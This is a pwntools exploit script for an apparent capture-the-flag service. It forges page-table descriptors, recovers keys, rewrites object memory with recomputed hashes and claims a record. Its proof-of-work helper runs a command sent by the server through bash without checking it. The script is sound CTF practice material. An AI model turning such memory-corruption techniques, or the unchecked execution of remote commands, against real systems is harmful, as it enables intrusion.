#!/usr/bin/env python3
import re
import subprocess
import time
from pwn import *


HOST = args.HOST or "pwn.v1t.site"
PORT = int(args.PORT or 31338)
BIN = "./service"

MASK = (1 << 64) - 1


def mix(x: int) -> int:
    x &= MASK
    x ^= x >> 30
    x = (x * 0xbf58476d1ce4e5b9) & MASK
    x ^= x >> 27
    x = (x * 0x94d049bb133111eb) & MASK
    x ^= x >> 31
    return x & MASK


def rol(x: int, r: int) -> int:
    r &= 63
    return ((x << r) & MASK) | (x >> (64 - r))


def ror(x: int, r: int) -> int:
    r &= 63
    return ((x >> r) | ((x << (64 - r)) & MASK)) & MASK


def h28d0(q0: int, q1: int, q2: int, q3: int, d20: int, d24: int) -> int:
    x = q0 ^ q2 ^ ((d20 & 0xffffffff) << 32) ^ rol(q1, 7) ^ rol(q3, 0x13) ^ (d24 & 0xffffffff) ^ 0x43514B3D9F2A1187
    return mix(x)


def h2950(q0: int, q1: int, q2: int, q3: int, d20: int, d24: int) -> int:
    x = q0 ^ ((d20 & 0xffffffff) << 32) ^ rol(q1, 5) ^ rol(q2, 0x11) ^ rol(q3, 0x1D) ^ (d24 & 0xffffffff) ^ 0x80D1F337A11C290B
    return mix(x)


def h29d0(q0: int, q1: int, q2: int, q3: int, q4: int, d30: int, d34: int) -> int:
    x = q0 ^ q4 ^ ((d30 & 0xffffffff) << 32) ^ rol(q1, 3) ^ rol(q2, 0x0D) ^ rol(q3, 0x17) ^ rol(0xFFFFFFFFFFFFFFFF, 0x1F) ^ (d34 & 0xffffffff) ^ 0x9B2C76A1570C4D35
    return mix(x)


def h2a60(q0: int, q1: int, q2: int, d18: int, d1c: int) -> int:
    x = q0 ^ rol(q1, 0x0B) ^ ror(q2, 0x17) ^ ((d18 & 0xffffffff) << 32) ^ (d1c & 0xffffffff) ^ 0x321F0CC8C7A4B621
    return mix(x)


def h2ad0(q0: int, q1: int, q2: int, q3: int, q4: int) -> int:
    x = q0 ^ q2 ^ ror(q4, 0x1F) ^ rol(q1, 9) ^ rol(q3, 0x15) ^ 0x6E34F88BD14A2039
    return mix(x)


def root_cross_hash(root10: int, objb20: int, objc30: int, objd18: int, obje10: int, obje20: int) -> int:
    x = ((objd18 & 0xffffffff) << 7) ^ obje10 ^ root10 ^ (objc30 & 0xffffffff) ^ rol(obje20, 0x0F) ^ ((objb20 & 0xffffffff) << 32) ^ 0x43B8D13D98A22104
    return mix(x)


def desc_out(level: int, idx: int, page: int, flags: int) -> int:
    nib = (mix(((idx << 5) ^ flags ^ (page << 17) ^ (level * 4) ^ 0x2B992DDFA23249D6) & MASK) << 4) & 0xFF0
    return ((page << 12) | flags | nib) & MASK


def encode_desc(a: int, b: int, lvl: int, idx: int, out: int) -> tuple[int, int]:
    mix1 = mix(((lvl << 12) ^ (idx << 32) ^ 0x4D0F1A2C77B90582) & MASK)
    rot = (((idx * 8 - idx + ((-lvl) & 0xD)) & 0x1F) + 9)
    q0 = rol((mix1 + a) & MASK, rot) ^ out
    q1 = ((mix((q0 ^ (idx << 32) ^ lvl ^ 0xA6D9B3C81D0F77A9) & MASK) + b + out) & MASK) ^ rol(a, 0x17)
    return q0, q1


def encode_desc_params(a: int, b: int, lvl: int, idx: int, page: int, flags: int) -> tuple[int, int]:
    return encode_desc(a, b, lvl, idx, desc_out(lvl, idx, page, flags))


def recover_keys(q0: int, q1: int, lvl: int, idx: int, out: int) -> tuple[int, int]:
    mix1 = mix(((lvl << 12) ^ (idx << 32) ^ 0x4D0F1A2C77B90582) & MASK)
    rot = (((idx * 8 - idx + ((-lvl) & 0xD)) & 0x1F) + 9)
    a = (ror(q0 ^ out, rot) - mix1) & MASK
    b = ((q1 ^ rol(a, 0x17)) - mix((q0 ^ (idx << 32) ^ lvl ^ 0xA6D9B3C81D0F77A9) & MASK) - out) & MASK
    return a, b


def start():
    if args.LOCAL:
        return process([BIN], cwd=".")
    io = remote(HOST, PORT)
    solve_pow(io)
    return io


def solve_pow(io):
    first = io.recvline(timeout=2)
    if first != b"proof of work:\n":
        io.unrecv(first)
        return

    cmd = io.recvline(timeout=2).decode().strip()
    io.recvuntil(b"solution: ")
    sol = subprocess.check_output(["bash", "-lc", cmd], text=True).strip()
    io.sendline(sol.encode())


def menu(io, n):
    io.sendlineafter(b"> ", str(n).encode())


def open_pipe(io, pid=1, slots=0x40):
    menu(io, 1)
    io.sendlineafter(b"id: ", str(pid).encode())
    io.sendlineafter(b"slots: ", str(slots).encode())
    return io.recvline().strip()


def mirror_pipe(io, pid=1) -> int:
    menu(io, 2)
    io.sendlineafter(b"id: ", str(pid).encode())
    return int(io.recvline().split(b"=")[1])


def drop_pipe(io, pid=1):
    menu(io, 3)
    io.sendlineafter(b"id: ", str(pid).encode())
    return io.recvline().strip()


def send_packet(io, view: int, slot: int, x: int, y: int):
    menu(io, 4)
    io.sendlineafter(b"view: ", str(view).encode())
    io.sendlineafter(b"slot: ", str(slot).encode())
    io.sendlineafter(b"x: ", hex(x).encode())
    io.sendlineafter(b"y: ", hex(y).encode())
    return io.recvline().strip()


def trace_packet(io, view: int, slot: int) -> tuple[int, int]:
    menu(io, 5)
    io.sendlineafter(b"view: ", str(view).encode())
    io.sendlineafter(b"slot: ", str(slot).encode())
    line = io.recvline().decode().strip()
    m = re.search(r"x=0x([0-9a-f]+) y=0x([0-9a-f]+)", line)
    if not m:
        raise ValueError(line)
    return int(m.group(1), 16), int(m.group(2), 16)


def open_workspace(io) -> int:
    menu(io, 6)
    return int(io.recvline().split(b"=")[1])


def attach_shelf(io, ws: int, shelf: int):
    menu(io, 7)
    io.sendlineafter(b"ws: ", str(ws).encode())
    io.sendlineafter(b"shelf: ", str(shelf).encode())
    return io.recvline().strip()


def fetch_slice(io, ws: int, addr: int, length: int) -> bytes:
    menu(io, 8)
    io.sendlineafter(b"ws: ", str(ws).encode())
    io.sendlineafter(b"addr: ", hex(addr).encode())
    io.sendlineafter(b"len: ", hex(length).encode())
    line = io.recvline().strip()
    if line == b"fault":
        raise RuntimeError("fault")
    return bytes.fromhex(line.decode())


def store_slice(io, ws: int, addr: int, data: bytes):
    menu(io, 9)
    io.sendlineafter(b"ws: ", str(ws).encode())
    io.sendlineafter(b"addr: ", hex(addr).encode())
    io.sendlineafter(b"len: ", hex(len(data)).encode())
    io.sendlineafter(b"hex: ", data.hex().encode())
    return io.recvline().strip()


def sync_ledger(io, ws: int):
    menu(io, 10)
    io.sendlineafter(b"ws: ", str(ws).encode())
    return io.recvline().strip()


def claim_record(io):
    menu(io, 13)
    return io.recvline(timeout=2)


def build_order0(io):
    open_pipe(io, 1, 0x40)
    mirror_pipe(io, 1)
    drop_pipe(io, 1)
    ws = open_workspace(io)
    attach_shelf(io, ws, 1)
    sync_ledger(io, ws)
    return ws


def build_order1(io):
    open_pipe(io, 1, 0x200)
    mirror_pipe(io, 1)
    drop_pipe(io, 1)
    ws = open_workspace(io)
    attach_shelf(io, ws, 1)
    sync_ledger(io, ws)
    return ws


def build_dual(io):
    open_pipe(io, 1, 0x40)
    mirror_pipe(io, 1)
    drop_pipe(io, 1)
    open_pipe(io, 2, 0x200)
    mirror_pipe(io, 2)
    drop_pipe(io, 2)
    ws = open_workspace(io)
    attach_shelf(io, ws, 1)
    sync_ledger(io, ws)
    return ws


def q(x: bytes, off: int) -> int:
    return u64(x[off:off + 8])


def p(x: int) -> bytes:
    return p64(x)


def dword(buf: bytes | bytearray, off: int) -> int:
    return u32(bytes(buf[off:off + 4]))


def check_state(obja: bytearray, objb: bytearray, objc: bytearray, objd: bytearray, obje: bytearray):
    print("A.hash", hex(q(obja, 0x28)), hex(h28d0(q(obja, 0x00), q(obja, 0x08), q(obja, 0x10), q(obja, 0x18), dword(obja, 0x20), dword(obja, 0x24))))
    print("B.hash", hex(q(objb, 0x28)), hex(h2950(q(objb, 0x00), q(objb, 0x08), q(objb, 0x10), q(objb, 0x18), dword(objb, 0x20), dword(objb, 0x24))))
    print("C.hash", hex(q(objc, 0x38)), hex(h29d0(q(objc, 0x00), q(objc, 0x08), q(objc, 0x10), q(objc, 0x18), q(objc, 0x20), dword(objc, 0x30), dword(objc, 0x34))))
    print("D.hash", hex(q(objd, 0x20)), hex(h2a60(q(objd, 0x00), q(objd, 0x08), q(objd, 0x10), dword(objd, 0x18), dword(objd, 0x1C))))
    print("E.hash", hex(q(obje, 0x28)), hex(h2ad0(q(obje, 0x00), q(obje, 0x08), q(obje, 0x10), q(obje, 0x18), q(obje, 0x20))))
    print("A.cross", hex(q(obja, 0x18)), hex(root_cross_hash(q(obja, 0x10), dword(objb, 0x20), dword(objc, 0x30), dword(objd, 0x18), q(obje, 0x10), q(obje, 0x20))))
    print("C.mask", hex(q(objc, 0x20) & 0x40002004081))
    print("E.mask", hex((~q(obje, 0x10)) & 0x8000000000002491))


def main():
    io = start()
    ws = build_dual(io)

    q0, q1 = trace_packet(io, 0, 1)
    first_level_out = desc_out(0, 1, 24, 9)
    a, b = recover_keys(q0, q1, 0, 1, first_level_out)
    log.info(f"workspace keys A={a:#x} B={b:#x}")

    # Point second-level slots 0xa8..0xac to pages 8..12 with RW perms.
    for idx, page in zip(range(0xA8, 0xAD), range(8, 13)):
        x, y = encode_desc_params(a, b, 1, idx, page, 7)
        send_packet(io, 1, idx, x, y)

    va = {
        "A": 0x1A8000,
        "B": 0x1A9000,
        "C": 0x1AA000,
        "D": 0x1AB000,
        "E": 0x1AC000,
    }

    obja = bytearray(fetch_slice(io, ws, va["A"] + 0x120, 0x30))
    objb = bytearray(fetch_slice(io, ws, va["B"] + 0x260, 0x30))
    objc = bytearray(fetch_slice(io, ws, va["C"] + 0x090, 0x40))
    objd = bytearray(fetch_slice(io, ws, va["D"] + 0x330, 0x28))
    obje = bytearray(fetch_slice(io, ws, va["E"] + 0x1D0, 0x30))

    A_ptr = 0x8120
    B_ptr = 0x9260
    C_ptr = 0xA090
    D_ptr = 0xB330
    E_ptr = 0xC1D0

    obja[0x00:0x08] = p(A_ptr)
    obja[0x08:0x10] = p(B_ptr)
    obja[0x18:0x20] = b"\x00" * 8
    obja[0x24:0x28] = p32(0x31415927)

    objb[0x00:0x08] = p(B_ptr)
    objb[0x08:0x10] = p(A_ptr)
    objb[0x10:0x18] = p(C_ptr)
    objb[0x18:0x20] = p(D_ptr)
    objb[0x20:0x24] = p32(0x5D21)
    objb[0x24:0x28] = p32(0x27182818)
    objb[0x28:0x30] = p(h2950(B_ptr, A_ptr, C_ptr, D_ptr, 0x5D21, 0x27182818))

    objc[0x00:0x08] = p(C_ptr)
    objc[0x08:0x10] = p(B_ptr)
    objc[0x10:0x18] = p(D_ptr)
    objc[0x18:0x20] = p(E_ptr)
    objc[0x20:0x28] = p(0x40002004081)
    objc[0x28:0x30] = p(0xFFFFFFFFFFFFFFFF)
    objc[0x30:0x34] = p32(0x7012)
    objc[0x34:0x38] = p32(3)
    objc[0x38:0x40] = p(h29d0(C_ptr, B_ptr, D_ptr, E_ptr, 0x40002004081, 0x7012, 3))

    objd[0x00:0x08] = p(D_ptr)
    objd[0x08:0x10] = p(E_ptr)
    objd[0x10:0x18] = p(0)
    objd[0x18:0x1C] = p32(0x900A)
    objd[0x1C:0x20] = p32(4)
    objd[0x20:0x28] = p(h2a60(D_ptr, E_ptr, 0, 0x900A, 4))

    obje20 = q(obje, 0x20)
    obje[0x00:0x08] = p(E_ptr)
    obje[0x08:0x10] = p(C_ptr)
    obje[0x10:0x18] = p(0x8000000000002491)
    obje[0x18:0x20] = p(0xFFFFFFFFFFFFFFFF)
    obje[0x20:0x28] = p(obje20)
    obje[0x28:0x30] = p(h2ad0(E_ptr, C_ptr, 0x8000000000002491, 0xFFFFFFFFFFFFFFFF, obje20))

    obja10 = q(obja, 0x10)
    obja[0x18:0x20] = p(root_cross_hash(obja10, 0x5D21, 0x7012, 0x900A, 0x8000000000002491, obje20))
    obja[0x20:0x24] = p32(0x5000)
    obja[0x24:0x28] = p32(0x31415927)
    obja[0x28:0x30] = p(h28d0(A_ptr, B_ptr, obja10, q(obja, 0x18), 0x5000, 0x31415927))

    if args.CHECK:
        check_state(obja, objb, objc, objd, obje)

    store_slice(io, ws, va["A"] + 0x120, bytes(obja))
    store_slice(io, ws, va["B"] + 0x260, bytes(objb))
    store_slice(io, ws, va["C"] + 0x090, bytes(objc))
    store_slice(io, ws, va["D"] + 0x330, bytes(objd))
    store_slice(io, ws, va["E"] + 0x1D0, bytes(obje))

    if args.CHECK:
        ra = fetch_slice(io, ws, va["A"] + 0x120, 0x30)
        rb = fetch_slice(io, ws, va["B"] + 0x260, 0x30)
        rc = fetch_slice(io, ws, va["C"] + 0x090, 0x40)
        rd = fetch_slice(io, ws, va["D"] + 0x330, 0x28)
        re_ = fetch_slice(io, ws, va["E"] + 0x1D0, 0x30)
        print("REFETCH", ra == bytes(obja), rb == bytes(objb), rc == bytes(objc), rd == bytes(objd), re_ == bytes(obje))

    if args.PAUSE:
        log.info(f"attach now: pid={io.pid}")
        time.sleep(20)

    out = claim_record(io)
    if out:
        print(out.decode(errors="ignore"), end="")
    rest = io.recvrepeat(1)
    if rest:
        print(rest.decode(errors="ignore"), end="")

    io.close()


if __name__ == "__main__":
    main()
